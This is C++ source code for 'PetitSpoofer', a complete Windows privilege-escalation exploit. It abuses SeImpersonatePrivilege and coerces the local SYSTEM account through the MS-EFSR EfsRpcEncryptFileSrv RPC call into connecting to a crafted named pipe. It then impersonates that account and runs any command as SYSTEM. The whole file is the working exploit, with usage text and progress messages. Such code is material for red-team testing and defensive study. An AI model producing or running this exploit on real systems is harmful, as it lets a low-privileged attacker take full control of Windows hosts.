/*
* Configured to compile as a statically linked binary (/MT) with C++20 (/std:c++20).
*/

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "Userenv.lib")

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <rpc.h>
#include <UserEnv.h>

#include <format>
#include <iostream>
#include <memory>
#include <string>

/*
* MS-EFSR IDL
* 
* Compiled with (32-bit):
*	midl /win32 /target NT100 ms-dtyp.idl
*	midl /win32 /target NT100 ms-efsr.idl
* 
* Compiled with (64-bit):
*	midl /amd64 /target NT100 ms-dtyp.idl
*	midl /amd64 /target NT100 ms-efsr.idl
* 
* The necessary types from "ms-dtyp.h" were moved to "ms-efsr.h".
* Structs in "ms-efsr.h" were renamed to avoid redefinition errors.
* 32-bit: "MIDL_user_allocate" defined as wrapper around "malloc". "MIDL_user_free" defined as wrapper around "free".
* 64-bit: "MIDL_user_allocate" set to "malloc" and "MIDL_user_free" set to "free".
*/
#include "ms-efsr.h"

#pragma warning(disable: 6031)
#pragma warning(disable: 6387)

// Types for RAII
template <typename T, auto deleter>
using unique_ptr_del = std::unique_ptr<T, std::integral_constant<decltype(deleter), deleter>>;
using unique_handle = unique_ptr_del<std::remove_pointer<HANDLE>::type, &CloseHandle>;

constexpr DWORD MAX_NAME_LENGTH = 256;

static void output(const std::wstring& text)
{
	std::wcout << text << std::endl;
}

static void print_usage()
{
	output(L"Usage: PetitSpoofer.exe [-h] [-i] <cmd>");
	output(L"  -h    Print this text and exit.");
	output(L"  -i    Interact with spawned process.");
	output(L"  cmd   Command to execute.");
}

static bool enable_privilege()
{
	// Open the process token
	HANDLE token;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token))
	{
		return false;
	}
	unique_handle token_managed(token);

	// Get privilege LUID
	LUID impersonate_privilege;
	LookupPrivilegeValueW(NULL, SE_IMPERSONATE_NAME, &impersonate_privilege);

	// Enable SeImpersonatePrivilege
	TOKEN_PRIVILEGES new_privileges =
	{
		.PrivilegeCount = 1,
		.Privileges =
		{
			{
				.Luid = impersonate_privilege,
				.Attributes = SE_PRIVILEGE_ENABLED
			}
		}
	};
	if (!AdjustTokenPrivileges(token, FALSE, &new_privileges, 0, NULL, NULL)
		|| GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		return false;
	}

	return true;
}

static std::wstring generate_uuid()
{
	// Create UUID
	UUID uuid;
	UuidCreate(&uuid);

	// Convert UUID to string
	RPC_WSTR uuid_rpc;
	UuidToStringW(&uuid, &uuid_rpc);
	std::wstring uuid_str(reinterpret_cast<wchar_t*>(uuid_rpc));

	// Free UUID and return string
	RpcStringFreeW(&uuid_rpc);
	return uuid_str;
}

static unique_handle start_named_pipe_listener(HANDLE pipe, OVERLAPPED& ol)
{
	// Create event
	auto event = CreateEventW(NULL, TRUE, FALSE, NULL);
	if (!event)
	{
		return NULL;
	}
	ol.hEvent = event;
	unique_handle event_managed(event);

	// Connect the pipe asynchronously
	if (!ConnectNamedPipe(pipe, &ol)
		&& GetLastError() != ERROR_IO_PENDING)
	{
		return NULL;
	}

	return event_managed;
}

// Separate function for the RPC stuff requiring SEH
static bool call_rpc(RPC_BINDING_HANDLE binding_handle, wchar_t* pipe_name)
{
	RpcTryExcept
	{
		EfsRpcEncryptFileSrv(binding_handle, pipe_name);
	}
	RpcExcept(TRUE)
	{
		// We should always end up here with RPC_S_CALL_CANCELLED due to the timeout
		if (RpcExceptionCode() != RPC_S_CALL_CANCELLED)
		{
			return false;
		}
	}
	RpcEndExcept
	return true;
}

static bool trigger_callback(const std::wstring& pipe_name)
{
	// Create string binding
	RPC_WSTR string_binding;
	if (RpcStringBindingComposeW(
		reinterpret_cast<RPC_WSTR>(const_cast<wchar_t*>(L"c681d488-d850-11d0-8c52-00c04fd90f7e")),
		reinterpret_cast<RPC_WSTR>(const_cast<wchar_t*>(L"ncacn_np")),
		reinterpret_cast<RPC_WSTR>(const_cast<wchar_t*>(L"localhost")),
		reinterpret_cast<RPC_WSTR>(const_cast<wchar_t*>(L"\\pipe\\lsarpc")),
		NULL,
		&string_binding) != RPC_S_OK)
	{
		return false;
	}
	unique_ptr_del<RPC_WSTR, &RpcStringFreeW> string_binding_managed(&string_binding);

	// Create actual binding
	RPC_BINDING_HANDLE binding_handle;
	if (RpcBindingFromStringBindingW(string_binding, &binding_handle) != RPC_S_OK)
	{
		return false;
	}
	unique_ptr_del<RPC_BINDING_HANDLE, &RpcBindingFree> binding_handle_managed(&binding_handle);

	// Set auth info
	if (RpcBindingSetAuthInfoW(
		binding_handle,
		reinterpret_cast<RPC_WSTR>(const_cast<wchar_t*>(L"localhost")),
		RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
		RPC_C_AUTHN_WINNT,
		NULL,
		RPC_C_AUTHZ_NONE) != RPC_S_OK)
	{
		return false;
	}

	// Set timeout to make the RPC call return immediately
	if (RpcBindingSetOption(binding_handle, RPC_C_OPT_CALL_TIMEOUT, 1) != RPC_S_OK)
	{
		return false;
	}

	// Trigger callback
	if (!call_rpc(binding_handle, const_cast<wchar_t*>(pipe_name.c_str())))
	{
		return false;
	}

	return true;
}

static std::wstring get_current_user()
{
	// Open the thread token
	HANDLE token;
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &token))
	{
		return L"";
	}
	unique_handle token_managed(token);

	// Get SID for user
	DWORD return_length;
	if (!GetTokenInformation(token, TokenUser, NULL, 0, &return_length)
		&& GetLastError() != ERROR_INSUFFICIENT_BUFFER)
	{
		return L"";
	}
	auto buffer = std::make_unique<uint8_t[]>(return_length);
	if (!GetTokenInformation(token, TokenUser, buffer.get(), return_length, &return_length))
	{
		return L"";
	}
	auto user = reinterpret_cast<TOKEN_USER*>(buffer.get());

	// Get username
	wchar_t name[MAX_NAME_LENGTH];
	wchar_t domain[MAX_NAME_LENGTH];
	auto name_length = MAX_NAME_LENGTH;
	auto domain_length = MAX_NAME_LENGTH;
	SID_NAME_USE snu;
	if (!LookupAccountSidW(NULL, user->User.Sid, name, &name_length, domain, &domain_length, &snu))
	{
		return L"";
	}

	return std::wstring(domain) + L"\\" + name;
}

static bool run_cmd(const std::wstring& cmd, bool interactive)
{
	// Open the thread token
	HANDLE token;
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, FALSE, &token))
	{
		return false;
	}
	unique_handle token_managed(token);

	// Get the SYSTEM environment
	LPVOID environment_block;
	if (!CreateEnvironmentBlock(&environment_block, token, FALSE))
	{
		return false;
	}
	unique_ptr_del<VOID, &DestroyEnvironmentBlock> environment_block_managed(environment_block);

	// Run command line with token
	STARTUPINFOW startup_info { .cb = sizeof(STARTUPINFOW) };
	PROCESS_INFORMATION process_information{};
	if (!CreateProcessAsUserW(  // We're SYSTEM at this point, so we have SeIncreaseQuotaPrivilege and SeAssignPrimaryTokenPrivilege
		token,  // Apparently, we don't need a primary token (?)
		NULL,
		const_cast<wchar_t*>(cmd.c_str()),
		NULL,
		NULL,
		interactive,
		CREATE_UNICODE_ENVIRONMENT | (interactive ? 0 : CREATE_NEW_CONSOLE),
		environment_block,
		NULL,
		&startup_info,
		&process_information))
	{
		return false;
	}

	// Wait for interactive session to finish
	if (interactive)
	{
		WaitForSingleObject(process_information.hProcess, INFINITE);
	}

	CloseHandle(process_information.hThread);
	CloseHandle(process_information.hProcess);
	return true;
}

int wmain(int argc, wchar_t* argv[])
{
	// Parse arguments
	bool interactive = false;
	std::wstring cmd;
	for (auto i = 1; i < argc; i++)
	{
		std::wstring arg(argv[i]);
		if (arg == L"-h")
		{
			print_usage();
			return 0;
		}
		else if (arg == L"-i")
		{
			interactive = true;
		}
		else
		{
			cmd = arg;
		}
	}
	if (cmd.empty())
	{
		print_usage();
		return 0;
	}
	output(std::format(L"[*] Command: {}", cmd));
	output(std::format(L"[*] Interactive: {}\n", interactive));

	// Enable SeImpersonatePrivilege, in case it's not already enabled
	output(L"[*] Enabling SeImpersonatePrivilege...");
	if (!enable_privilege())
	{
		output(L"[-] Failed to enable SeImpersonatePrivilege :(");
		return 0;
	}
	output(L"[+] SeImpersonatePrivilege enabled.");

	// Create named pipe
	output(L"[*] Creating named pipe...");
	auto uuid = generate_uuid();
	auto pipe_name = L"\\\\.\\pipe\\" + uuid + L"\\pipe\\srvsvc";
	HANDLE pipe = CreateNamedPipeW(pipe_name.c_str(), PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, 0, 1, 0, 0, 0, NULL);
	if (pipe == INVALID_HANDLE_VALUE)
	{
		output(L"[-] Failed to create pipe :(");
		return 0;
	}
	unique_handle pipe_managed(pipe);
	output(std::format(L"[+] Pipe created: {}", pipe_name.replace(2, 1, L"localhost")));

	// Start listener
	OVERLAPPED ol{};
	output(L"[*] Starting listener...");
	auto event = start_named_pipe_listener(pipe, ol);
	if (!event)
	{
		output(L"[-] Failed to start listener :(");
		return 0;
	}
	output(L"[+] Listener started.");

	// Trigger callback
	output(L"[*] Triggering callback...");
	if (!trigger_callback(L"\\\\localhost/pipe/" + uuid + L"\\.\\"))  // Not sure why this works...
	{
		output(L"[-] Callback failed :(");
		return 0;
	}
	output(L"[+] Callback triggered.");

	// Wait for client to connect
	output(L"[*] Waiting for connection...");
	if (WaitForSingleObject(event.get(), 1000) != WAIT_OBJECT_0)
	{
		output(L"[-] No connection received :(");
		return 0;
	}
	output(L"[+] Connection received.");

	// Impersonate client
	output(L"[*] Impersonating client...");
	if (!ImpersonateNamedPipeClient(pipe))
	{
		output(L"[-] Failed to impersonate client :(");
		return 0;
	}
	output(L"[+] Client impersonated.");

	// Get username of impersonated user
	output(L"[*] Looking up username of impersonated user...");
	auto username = get_current_user();
	if (username.empty())
	{
		output(L"[-] Couldn't find username :(");
		return 0;
	}
	output(std::format(L"[+] Username: {}", username));

	// Execute command as impersonated user
	output(L"[*] Executing command as impersonated user...");
	if (!run_cmd(cmd, interactive))
	{
		output(L"[-] Failed to execute command :(");
		return 0;
	}
	output(L"[+] Command executed.");

	return 0;
}
